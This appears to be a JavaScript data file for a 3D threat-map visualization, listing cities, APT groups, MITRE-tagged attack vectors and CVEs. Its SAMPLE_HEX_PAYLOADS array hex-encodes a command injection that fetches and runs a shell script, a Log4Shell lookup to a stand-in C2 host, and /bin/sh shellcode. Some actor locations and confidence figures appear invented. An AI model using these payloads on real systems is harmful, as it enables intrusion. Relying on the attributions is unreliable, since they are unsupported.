/**
 * ThreatSphere 3D - Global Cyber Threat Intelligence Configuration
 * Accurate Geolocation, Real APT Threat Actors, MITRE ATT&CK Vectors, and CVEs
 */

export const SEVERITY_LEVELS = {
  CRITICAL: {
    name: 'CRITICAL',
    color: '#ff0055',
    colorHex: 0xff0055,
    rgb: [255, 0, 85],
    weight: 0.15,
    glow: 'rgba(255, 0, 85, 0.4)',
    badgeClass: 'badge-critical'
  },
  HIGH: {
    name: 'HIGH',
    color: '#ff6600',
    colorHex: 0xff6600,
    rgb: [255, 102, 0],
    weight: 0.30,
    glow: 'rgba(255, 102, 0, 0.4)',
    badgeClass: 'badge-high'
  },
  MEDIUM: {
    name: 'MEDIUM',
    color: '#ffcc00',
    colorHex: 0xffcc00,
    rgb: [255, 204, 0],
    weight: 0.35,
    glow: 'rgba(255, 204, 0, 0.35)',
    badgeClass: 'badge-medium'
  },
  LOW: {
    name: 'LOW',
    color: '#00f0ff',
    colorHex: 0x00f0ff,
    rgb: [0, 240, 255],
    weight: 0.20,
    glow: 'rgba(0, 240, 255, 0.35)',
    badgeClass: 'badge-low'
  }
};

export const CITIES = [
  // North America
  { name: 'Washington, D.C.', country: 'United States', code: 'US', lat: 38.9072, lon: -77.0369, region: 'NA', asns: ['AS36183', 'AS8075', 'AS7018'] },
  { name: 'New York', country: 'United States', code: 'US', lat: 40.7128, lon: -74.0060, region: 'NA', asns: ['AS174', 'AS209', 'AS3356'] },
  { name: 'San Francisco', country: 'United States', code: 'US', lat: 37.7749, lon: -122.4194, region: 'NA', asns: ['AS13335', 'AS15169', 'AS16509'] },
  { name: 'Chicago', country: 'United States', code: 'US', lat: 41.8781, lon: -87.6298, region: 'NA', asns: ['AS701', 'AS6939', 'AS2914'] },
  { name: 'Seattle', country: 'United States', code: 'US', lat: 47.6062, lon: -122.3321, region: 'NA', asns: ['AS16509', 'AS8075', 'AS396982'] },
  { name: 'Ottawa', country: 'Canada', code: 'CA', lat: 45.4215, lon: -75.6972, region: 'NA', asns: ['AS812', 'AS6539', 'AS577'] },
  { name: 'Toronto', country: 'Canada', code: 'CA', lat: 43.6532, lon: -79.3832, region: 'NA', asns: ['AS852', 'AS577', 'AS6539'] },
  { name: 'Mexico City', country: 'Mexico', code: 'MX', lat: 19.4326, lon: -99.1332, region: 'NA', asns: ['AS8151', 'AS13999', 'AS28403'] },

  // Europe
  { name: 'London', country: 'United Kingdom', code: 'GB', lat: 51.5074, lon: -0.1278, region: 'EU', asns: ['AS2856', 'AS5413', 'AS13037'] },
  { name: 'Paris', country: 'France', code: 'FR', lat: 48.8566, lon: 2.3522, region: 'EU', asns: ['AS3215', 'AS12322', 'AS16276'] },
  { name: 'Berlin', country: 'Germany', code: 'DE', lat: 52.5200, lon: 13.4050, region: 'EU', asns: ['AS3320', 'AS680', 'AS8881'] },
  { name: 'Frankfurt', country: 'Germany', code: 'DE', lat: 50.1109, lon: 8.6821, region: 'EU', asns: ['AS3320', 'AS8881', 'AS24940'] },
  { name: 'Kyiv', country: 'Ukraine', code: 'UA', lat: 50.4501, lon: 30.5234, region: 'EU', asns: ['AS15645', 'AS6849', 'AS21219'] },
  { name: 'Moscow', country: 'Russia', code: 'RU', lat: 55.7558, lon: 37.6173, region: 'EU', asns: ['AS12389', 'AS8359', 'AS25513'] },
  { name: 'St. Petersburg', country: 'Russia', code: 'RU', lat: 59.9343, lon: 30.3351, region: 'EU', asns: ['AS8359', 'AS12389', 'AS31133'] },
  { name: 'Warsaw', country: 'Poland', code: 'PL', lat: 52.2297, lon: 21.0122, region: 'EU', asns: ['AS5617', 'AS8308', 'AS12989'] },
  { name: 'Amsterdam', country: 'Netherlands', code: 'NL', lat: 52.3676, lon: 4.9041, region: 'EU', asns: ['AS1103', 'AS33915', 'AS49605'] },
  { name: 'Stockholm', country: 'Sweden', code: 'SE', lat: 59.3293, lon: 18.0686, region: 'EU', asns: ['AS3301', 'AS1653', 'AS1257'] },
  { name: 'Tallinn', country: 'Estonia', code: 'EE', lat: 59.4370, lon: 24.7536, region: 'EU', asns: ['AS3249', 'AS2586', 'AS8240'] },
  { name: 'Helsinki', country: 'Finland', code: 'FI', lat: 60.1699, lon: 24.9384, region: 'EU', asns: ['AS719', 'AS1759', 'AS6667'] },
  { name: 'Zurich', country: 'Switzerland', code: 'CH', lat: 47.3769, lon: 8.5417, region: 'EU', asns: ['AS3303', 'AS559', 'AS6730'] },
  { name: 'Brussels', country: 'Belgium', code: 'BE', lat: 50.8503, lon: 4.3517, region: 'EU', asns: ['AS5400', 'AS2611', 'AS8928'] },
  { name: 'Rome', country: 'Italy', code: 'IT', lat: 41.9028, lon: 12.4964, region: 'EU', asns: ['AS3269', 'AS12874', 'AS8612'] },
  { name: 'Madrid', country: 'Spain', code: 'ES', lat: 40.4168, lon: -3.7038, region: 'EU', asns: ['AS3352', 'AS12479', 'AS12715'] },

  // Asia-Pacific
  { name: 'Beijing', country: 'China', code: 'CN', lat: 39.9042, lon: 116.4074, region: 'APAC', asns: ['AS4134', 'AS4837', 'AS9808'] },
  { name: 'Shanghai', country: 'China', code: 'CN', lat: 31.2304, lon: 121.4737, region: 'APAC', asns: ['AS4134', 'AS4837', 'AS24400'] },
  { name: 'Shenzhen', country: 'China', code: 'CN', lat: 22.5431, lon: 114.0579, region: 'APAC', asns: ['AS4134', 'AS58466', 'AS9808'] },
  { name: 'Tokyo', country: 'Japan', code: 'JP', lat: 35.6762, lon: 139.6503, region: 'APAC', asns: ['AS2914', 'AS2497', 'AS2516'] },
  { name: 'Osaka', country: 'Japan', code: 'JP', lat: 34.6937, lon: 135.5023, region: 'APAC', asns: ['AS2497', 'AS2516', 'AS4713'] },
  { name: 'Seoul', country: 'South Korea', code: 'KR', lat: 37.5665, lon: 126.9780, region: 'APAC', asns: ['AS9318', 'AS4766', 'AS3786'] },
  { name: 'Pyongyang', country: 'North Korea', code: 'KP', lat: 39.0392, lon: 125.7625, region: 'APAC', asns: ['AS131279', 'AS4983'] },
  { name: 'Taipei', country: 'Taiwan', code: 'TW', lat: 25.0330, lon: 121.5654, region: 'APAC', asns: ['AS3462', 'AS4780', 'AS18182'] },
  { name: 'Singapore', country: 'Singapore', code: 'SG', lat: 1.3521, lon: 103.8198, region: 'APAC', asns: ['AS4657', 'AS7473', 'AS18101'] },
  { name: 'Sydney', country: 'Australia', code: 'AU', lat: -33.8688, lon: 151.2093, region: 'APAC', asns: ['AS1221', 'AS7545', 'AS4826'] },
  { name: 'Canberra', country: 'Australia', code: 'AU', lat: -35.2809, lon: 149.1300, region: 'APAC', asns: ['AS7545', 'AS13335', 'AS1221'] },
  { name: 'New Delhi', country: 'India', code: 'IN', lat: 28.6139, lon: 77.2090, region: 'APAC', asns: ['AS9498', 'AS55836', 'AS45609'] },
  { name: 'Mumbai', country: 'India', code: 'IN', lat: 19.0760, lon: 72.8777, region: 'APAC', asns: ['AS4755', 'AS9498', 'AS55836'] },
  { name: 'Bangkok', country: 'Thailand', code: 'TH', lat: 13.7563, lon: 100.5018, region: 'APAC', asns: ['AS23969', 'AS17552', 'AS9834'] },
  { name: 'Jakarta', country: 'Indonesia', code: 'ID', lat: -6.2088, lon: 106.8456, region: 'APAC', asns: ['AS7713', 'AS17974', 'AS23693'] },
  { name: 'Manila', country: 'Philippines', code: 'PH', lat: 14.5995, lon: 120.9842, region: 'APAC', asns: ['AS9299', 'AS4775', 'AS10139'] },

  // Middle East
  { name: 'Tel Aviv', country: 'Israel', code: 'IL', lat: 32.0853, lon: 34.7818, region: 'ME', asns: ['AS12849', 'AS8551', 'AS1680'] },
  { name: 'Tehran', country: 'Iran', code: 'IR', lat: 35.6892, lon: 51.3890, region: 'ME', asns: ['AS58224', 'AS197207', 'AS44244'] },
  { name: 'Riyadh', country: 'Saudi Arabia', code: 'SA', lat: 24.7136, lon: 46.6753, region: 'ME', asns: ['AS39386', 'AS25019', 'AS48281'] },
  { name: 'Dubai', country: 'UAE', code: 'AE', lat: 25.2048, lon: 55.2708, region: 'ME', asns: ['AS5384', 'AS15802', 'AS34989'] },
  { name: 'Ankara', country: 'Turkey', code: 'TR', lat: 39.9334, lon: 32.8597, region: 'ME', asns: ['AS9121', 'AS47720', 'AS15897'] },
  { name: 'Doha', country: 'Qatar', code: 'QA', lat: 25.2854, lon: 51.5310, region: 'ME', asns: ['AS8781', 'AS20864', 'AS30985'] },

  // Latin America & Africa
  { name: 'São Paulo', country: 'Brazil', code: 'BR', lat: -23.5505, lon: -46.6333, region: 'LATAM', asns: ['AS28573', 'AS18881', 'AS262589'] },
  { name: 'Buenos Aires', country: 'Argentina', code: 'AR', lat: -34.6037, lon: -58.3816, region: 'LATAM', asns: ['AS7303', 'AS22927', 'AS10481'] },
  { name: 'Santiago', country: 'Chile', code: 'CL', lat: -33.4489, lon: -70.6693, region: 'LATAM', asns: ['AS27651', 'AS7418', 'AS14259'] },
  { name: 'Bogota', country: 'Colombia', code: 'CO', lat: 4.7110, lon: -74.0721, region: 'LATAM', asns: ['AS3816', 'AS10700', 'AS13489'] },
  { name: 'Johannesburg', country: 'South Africa', code: 'ZA', lat: -26.2041, lon: 28.0473, region: 'AFRICA', asns: ['AS37100', 'AS36937', 'AS16637'] },
  { name: 'Cairo', country: 'Egypt', code: 'EG', lat: 30.0444, lon: 31.2357, region: 'AFRICA', asns: ['AS8452', 'AS24863', 'AS36935'] },
  { name: 'Lagos', country: 'Nigeria', code: 'NG', lat: 6.5244, lon: 3.3792, region: 'AFRICA', asns: ['AS37148', 'AS37282', 'AS37078'] },
  { name: 'Nairobi', country: 'Kenya', code: 'KE', lat: -1.2921, lon: 36.8219, region: 'AFRICA', asns: ['AS36914', 'AS37061', 'AS37293'] }
];

export const THREAT_ACTORS = [
  {
    name: 'APT29 (Cozy Bear)',
    aliases: ['Midnight Blizzard', 'Nobelium', 'The Dukes'],
    allegiance: 'Russian Federation (SVR)',
    country: 'Russia',
    city: 'Moscow',
    motivation: 'Strategic Geopolitical Espionage',
    confidence: '98%',
    signature: 'WellMess, EnvyScout, Cloud Token Abuse',
    preferredVectors: ['Zero-Day Edge Gateway RCE', 'Cloud IAM Privilege Escalation', 'Supply Chain Compromise']
  },
  {
    name: 'APT28 (Fancy Bear)',
    aliases: ['STRONTIUM', 'Sofacy', 'Pawn Storm'],
    allegiance: 'Russian Federation (GRU 85th GTsSS)',
    country: 'Russia',
    city: 'St. Petersburg',
    motivation: 'Military Sabotage & Influence Ops',
    confidence: '96%',
    signature: 'X-Agent, Zebrocy, Drovorub Kernel Rootkit',
    preferredVectors: ['Living-off-the-Land WMI / PowerShell', 'BGP Autonomous System Hijack', 'SCADA / Modbus Register Tamper']
  },
  {
    name: 'Sandworm Team',
    aliases: ['TeleBots', 'Voodoo Bear', 'Unit 74455'],
    allegiance: 'Russian Federation (GRU)',
    country: 'Russia',
    city: 'Moscow',
    motivation: 'Critical Infrastructure Destructive Sabotage',
    confidence: '99%',
    signature: 'Industroyer2, CaddyWiper, HermeticWiper',
    preferredVectors: ['SCADA / Modbus Register Tamper', 'Kernel Memory Corruption / Rootkit', 'BGP Autonomous System Hijack']
  },
  {
    name: 'Volt Typhoon',
    aliases: ['BRONZE SILHOUETTE', 'Vanguard Panda', 'Insidious Taurus'],
    allegiance: 'People\'s Republic of China (State-Sponsored)',
    country: 'China',
    city: 'Beijing',
    motivation: 'Pre-positioning on Critical Infrastructure',
    confidence: '95%',
    signature: 'KV-botnet, SOHO Router Exploits, Fast Reverse Proxy',
    preferredVectors: ['Zero-Day Edge Gateway RCE', 'Living-off-the-Land WMI / PowerShell', 'DNS Tunneling & Cobalt Strike C2']
  },
  {
    name: 'APT41 (Winnti Group)',
    aliases: ['Barium', 'Wicked Panda', 'Brass Typhoon'],
    allegiance: 'People\'s Republic of China (MSS Dual-Operative)',
    country: 'China',
    city: 'Beijing',
    motivation: 'Dual Espionage & Financially Motivated Theft',
    confidence: '94%',
    signature: 'Crosswalk, ShadowPad, High-Speed WebShells',
    preferredVectors: ['Supply Chain Compromise', 'Blind SQL Injection & Data Exfiltration', 'Zero-Day Edge Gateway RCE']
  },
  {
    name: 'Lazarus Group',
    aliases: ['HIDDEN COBRA', 'Guardians of Peace', 'Zinc'],
    allegiance: 'Democratic People\'s Republic of Korea (RGB)',
    country: 'North Korea',
    city: 'Pyongyang',
    motivation: 'State Revenue Generation & Cryptocurrency Theft',
    confidence: '97%',
    signature: 'Fallchill, Manuscrypt, DTrack Trojan',
    preferredVectors: ['Supply Chain Compromise', 'High-Volume Credential Stuffing', 'Terabit Anycast DDoS Flood']
  },
  {
    name: 'Scattered Spider',
    aliases: ['UNC3944', 'Octo Tempest', '0ktapus'],
    allegiance: 'Transnational Cybercrime Syndicate',
    country: 'United States',
    city: 'Chicago',
    motivation: 'Ransomware Extortion & Identity Takeover',
    confidence: '92%',
    signature: 'SIM Swapping, Okta Session Hijack, EDR Bypass',
    preferredVectors: ['Cloud IAM Privilege Escalation', 'High-Volume Credential Stuffing', 'Double Extortion Ransomware']
  },
  {
    name: 'LockBit 3.0',
    aliases: ['LockBit Black', 'Bitwise Spider'],
    allegiance: 'Transnational Ransomware Cartel',
    country: 'Russia',
    city: 'Moscow',
    motivation: 'High-Value Corporate Extortion',
    confidence: '95%',
    signature: 'LockBit Stealer, VSS Wiper, Custom Packer',
    preferredVectors: ['Double Extortion Ransomware', 'Zero-Day Edge Gateway RCE', 'Kerberoasting & AD Domain Escalation']
  },
  {
    name: 'APT33 (Elfin)',
    aliases: ['Refined Kitten', 'Holmium', 'Magnallium'],
    allegiance: 'Islamic Republic of Iran (IRGC)',
    country: 'Iran',
    city: 'Tehran',
    motivation: 'Aviation & Petrochemical Sabotage',
    confidence: '91%',
    signature: 'Shamoon Wiper, DropShot, TurnedUp',
    preferredVectors: ['SCADA / Modbus Register Tamper', 'Blind SQL Injection & Data Exfiltration', 'Terabit Anycast DDoS Flood']
  },
  {
    name: 'Turla',
    aliases: ['Snake', 'Waterbug', 'Krypton', 'Venomous Bear'],
    allegiance: 'Russian Federation (FSB Center 16)',
    country: 'Russia',
    city: 'Moscow',
    motivation: 'Stealth High-Grade Military Intelligence',
    confidence: '96%',
    signature: 'Snake Rootkit, Carbon, Satellite C2 Hijacking',
    preferredVectors: ['Kernel Memory Corruption / Rootkit', 'DNS Tunneling & Cobalt Strike C2', 'BGP Autonomous System Hijack']
  },
  {
    name: 'BlackCat (ALPHV)',
    aliases: ['Noberus', 'AlphaVM'],
    allegiance: 'Transnational Cybercrime Syndicate',
    country: 'Russia',
    city: 'St. Petersburg',
    motivation: 'Healthcare & Critical Infrastructure Extortion',
    confidence: '93%',
    signature: 'Rust-based Multi-Platform Encryptor, Exmatter',
    preferredVectors: ['Double Extortion Ransomware', 'Cloud IAM Privilege Escalation', 'Zero-Day Edge Gateway RCE']
  },
  {
    name: 'MuddyWater',
    aliases: ['Manga', 'Static Kitten', 'Mercury'],
    allegiance: 'Islamic Republic of Iran (MOIS)',
    country: 'Iran',
    city: 'Tehran',
    motivation: 'Telecommunications & Energy Sector Espionage',
    confidence: '90%',
    signature: 'POWERSTATS, SimpleRemote, Sloughter',
    preferredVectors: ['Living-off-the-Land WMI / PowerShell', 'DNS Tunneling & Cobalt Strike C2', 'Autonomous Reconnaissance Sweep']
  },
  {
    name: 'FIN7',
    aliases: ['Carbanak', 'Navigator Group'],
    allegiance: 'Transnational Financial Crime Syndicate',
    country: 'Poland',
    city: 'Warsaw',
    motivation: 'Global Banking & Point-of-Sale Fraud',
    confidence: '94%',
    signature: 'Carbanak POS Malware, GRIFFON Loader, Pillowmint',
    preferredVectors: ['Kerberoasting & AD Domain Escalation', 'High-Volume Credential Stuffing', 'Supply Chain Compromise']
  },
  {
    name: 'Anonymous Collective',
    aliases: ['GhostSec', 'Decentralized Hacktivist Cell'],
    allegiance: 'Decentralized International Hacktivist',
    country: 'Germany',
    city: 'Berlin',
    motivation: 'Geopolitical Protests & Defacement',
    confidence: '85%',
    signature: 'Low Orbit Ion Cannon, Mirai Variants, Pastebin Dumps',
    preferredVectors: ['Terabit Anycast DDoS Flood', 'Blind SQL Injection & Data Exfiltration', 'Autonomous Reconnaissance Sweep']
  }
];

export const ATTACK_VECTORS = [
  {
    name: 'Zero-Day Edge Gateway RCE',
    category: 'Exploitation',
    mitreTactic: 'Initial Access (TA0001)',
    mitreId: 'T1190',
    severity: 'CRITICAL',
    description: 'Unauthenticated remote code execution via pre-auth memory corruption on enterprise border firewall/VPN appliance.'
  },
  {
    name: 'SCADA / Modbus Register Tamper',
    category: 'ICS/SCADA',
    mitreTactic: 'Impact (TA0105)',
    mitreId: 'T0855',
    severity: 'CRITICAL',
    description: 'Direct PLC command injection modifying frequency setpoints and turbine safety interlocks in electrical grid distribution.'
  },
  {
    name: 'Kernel Memory Corruption / Rootkit',
    category: 'Persistence',
    mitreTactic: 'Defense Evasion (TA0005)',
    mitreId: 'T1014',
    severity: 'CRITICAL',
    description: 'Ring-0 kernel privilege escalation bypassing Driver Signature Enforcement to install persistent stealth hypervisor rootkit.'
  },
  {
    name: 'Double Extortion Ransomware',
    category: 'Ransomware',
    mitreTactic: 'Impact (TA0040)',
    mitreId: 'T1486',
    severity: 'HIGH',
    description: 'Automated multithreaded AES-256-GCM encryption with VSS shadow copy purge and simultaneous high-speed cloud exfiltration.'
  },
  {
    name: 'Terabit Anycast DDoS Flood',
    category: 'Denial of Service',
    mitreTactic: 'Impact (TA0040)',
    mitreId: 'T1498.002',
    severity: 'HIGH',
    description: 'Multi-vector UDP amplification flood exceeding 1.8 Tbps targeting Tier-1 telecommunications core and authoritative DNS root.'
  },
  {
    name: 'Supply Chain Compromise',
    category: 'Supply Chain',
    mitreTactic: 'Initial Access (TA0001)',
    mitreId: 'T1195.002',
    severity: 'HIGH',
    description: 'Malicious upstream build pipeline injection inserting backdoor binary telemetry into widely deployed enterprise signed software.'
  },
  {
    name: 'BGP Autonomous System Hijack',
    category: 'Network Infrastructure',
    mitreTactic: 'Defense Evasion (TA0005)',
    mitreId: 'T1584.004',
    severity: 'HIGH',
    description: 'Rogue BGP route announcement redirecting strategic transatlantic traffic through adversary-controlled intercept nodes.'
  },
  {
    name: 'Cloud IAM Privilege Escalation',
    category: 'Cloud Security',
    mitreTactic: 'Privilege Escalation (TA0004)',
    mitreId: 'T1078.004',
    severity: 'MEDIUM',
    description: 'Exploitation of permissive AWS/Azure STS role trust relationships granting administrative cross-tenant access.'
  },
  {
    name: 'Kerberoasting & AD Domain Escalation',
    category: 'Credential Access',
    mitreTactic: 'Credential Access (TA0006)',
    mitreId: 'T1558.003',
    severity: 'MEDIUM',
    description: 'Offline TGS ticket extraction and GPU cluster cracking targeting SPN service accounts for Active Directory domain elevation.'
  },
  {
    name: 'DNS Tunneling & Cobalt Strike C2',
    category: 'Command & Control',
    mitreTactic: 'Command and Control (TA0011)',
    mitreId: 'T1071.004',
    severity: 'MEDIUM',
    description: 'High-entropy base64 encoded command and control beaconing over port 53 bypassing deep packet inspection egress filters.'
  },
  {
    name: 'Blind SQL Injection & Data Exfiltration',
    category: 'Web Application',
    mitreTactic: 'Initial Access (TA0001)',
    mitreId: 'T1190',
    severity: 'MEDIUM',
    description: 'Time-based blind SQL injection in customer financial portal dumping partitioned customer database tables.'
  },
  {
    name: 'Living-off-the-Land WMI / PowerShell',
    category: 'Execution',
    mitreTactic: 'Execution (TA0002)',
    mitreId: 'T1047',
    severity: 'MEDIUM',
    description: 'Fileless in-memory execution using legitimate signed OS binaries (LOLBins) to dump LSASS credentials.'
  },
  {
    name: 'High-Volume Credential Stuffing',
    category: 'Identity',
    mitreTactic: 'Credential Access (TA0006)',
    mitreId: 'T1110.004',
    severity: 'LOW',
    description: 'Distributed residential proxy attack spraying 250,000 compromised credentials per minute against API authentication endpoints.'
  },
  {
    name: 'Autonomous Reconnaissance Sweep',
    category: 'Reconnaissance',
    mitreTactic: 'Reconnaissance (TA0043)',
    mitreId: 'T1595.002',
    severity: 'LOW',
    description: 'Synchronized SYN sweep probing ports 22, 443, 3389, and 8443 looking for unpatched zero-day vulnerable edge firmware.'
  }
];

export const CVES = [
  { id: 'CVE-2024-3400', cvss: 10.0, vendor: 'Palo Alto Networks', product: 'PAN-OS GlobalProtect', desc: 'Command injection in GlobalProtect gateway allows unauthenticated remote attacker to execute arbitrary OS code with root privileges.' },
  { id: 'CVE-2023-46805', cvss: 8.2, vendor: 'Ivanti', product: 'Connect Secure / Policy Secure', desc: 'Authentication bypass in Web components allows remote threat actors to access restricted resources.' },
  { id: 'CVE-2024-21762', cvss: 9.8, vendor: 'Fortinet', product: 'FortiOS SSL-VPN', desc: 'Out-of-bounds write vulnerability allows remote unauthenticated attacker to execute arbitrary code via specifically crafted HTTP requests.' },
  { id: 'CVE-2021-44228', cvss: 10.0, vendor: 'Apache Software Foundation', product: 'Log4j2 (Log4Shell)', desc: 'JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.' },
  { id: 'CVE-2024-6387', cvss: 8.1, vendor: 'OpenBSD / OpenSSH', product: 'OpenSSH (regreSSHion)', desc: 'Signal handler race condition in sshd allows unauthenticated remote code execution as root on glibc-based Linux systems.' },
  { id: 'CVE-2023-23397', cvss: 9.8, vendor: 'Microsoft', product: 'Outlook NTLM Relay', desc: 'Critical privilege escalation vulnerability triggering automatic NTLM authentication to attacker-controlled server upon mail delivery.' },
  { id: 'CVE-2024-1709', cvss: 10.0, vendor: 'ConnectWise', product: 'ScreenConnect', desc: 'Authentication bypass using an alternate path or channel allows unauthorized users to execute administrative setup workflows.' },
  { id: 'CVE-2023-34362', cvss: 9.8, vendor: 'Progress Software', product: 'MOVEit Transfer', desc: 'SQL injection vulnerability in the MOVEit Transfer web application could allow an unauthenticated attacker to gain access to the database.' },
  { id: 'CVE-2024-4577', cvss: 9.8, vendor: 'PHP Group', product: 'PHP-CGI Windows', desc: 'Argument injection vulnerability in PHP-CGI allows remote code execution on Windows installations due to Best-Fit character encoding.' },
  { id: 'CVE-2023-38606', cvss: 7.8, vendor: 'Apple', product: 'Kernel / Operation Triangulation', desc: 'Hardware MMIO registers vulnerability enabling bypassing of page table protections and kernel integrity enforcement.' },
  { id: 'CVE-2024-27348', cvss: 9.8, vendor: 'Apache Software Foundation', product: 'HugeGraph Server', desc: 'Remote code execution vulnerability via Gremlin expression injection in Apache HugeGraph Server.' },
  { id: 'CVE-2023-4966', cvss: 9.4, vendor: 'Citrix', product: 'NetScaler ADC / Gateway (Citrix Bleed)', desc: 'Sensitive information disclosure allows hijacking of authenticated active user sessions.' }
];

export const TARGET_SECTORS = [
  'Defense & National Intelligence',
  'Nuclear & Electrical Power Grid',
  'Central Banking & Financial Clearing',
  'Telecommunications & Cloud Core',
  'Aerospace & Satellite Communications',
  'Healthcare Systems & Bio-Research',
  'Petrochemical & Natural Gas Pipelines',
  'Autonomous Maritime Logistics',
  'High-Tech Semiconductor Foundries',
  'Government Civil Infrastructure'
];

export const SAMPLE_HEX_PAYLOADS = [
  {
    name: 'PAN-OS Command Injection Payload',
    bytes: '50 4f 53 54 20 2f 73 73 6c 2d 76 70 6e 2f 68 69 70 72 65 70 6f 72 74 2e 65 73 70 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 67 61 74 65 77 61 79 0d 0a 43 6f 6f 6b 69 65 3a 20 53 45 53 53 49 44 3d 60 63 75 72 6c 20 70 61 79 6c 6f 61 64 2e 73 68 7c 73 68 60 3b 0d 0a 0d 0a'
  },
  {
    name: 'Log4Shell JNDI Injection Header',
    bytes: '24 7b 6a 6e 64 69 3a 6c 64 61 70 3a 2f 2f 63 32 2e 64 61 72 6b 6e 65 74 2d 6d 69 72 72 6f 72 2e 72 75 3a 31 33 38 39 2f 45 78 70 6c 6f 69 74 4f 62 6a 65 63 74 2e 63 6c 61 73 73 7d 0d 0a'
  },
  {
    name: 'SCADA Modbus Write Single Register Frame',
    bytes: '00 01 00 00 00 06 01 06 00 64 ff ff 90 90 90 90 eb 0c 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 53 89 e1 99 b0 0b cd 80'
  },
  {
    name: 'Cobalt Strike Encrypted Beacon Traffic',
    bytes: '4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e8 00 00 00 00 5d 8b'
  },
  {
    name: 'DNS Base64 Exfiltration Fragment',
    bytes: '63 32 56 6a 63 6d 56 30 58 33 52 6c 59 32 68 75 61 57 4e 68 62 46 39 6b 62 32 4e 31 62 57 56 75 64 46 39 72 5a 58 6b 39 4f 54 52 6b 4f 47 46 68 5a 6d 4a 6a 2e 63 32 2e 64 65 66 65 6e 73 65 2e 6f 72 67'
  },
  {
    name: 'Linux Kernel eBPF Privilege Escalation Ring-0',
    bytes: '7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3e 00 01 00 00 00 70 05 40 00 00 00 00 00 40 00 00 00 00 00 00 00 30 1e 00 00 00 00 00 00 00 00 00 00'
  }
];
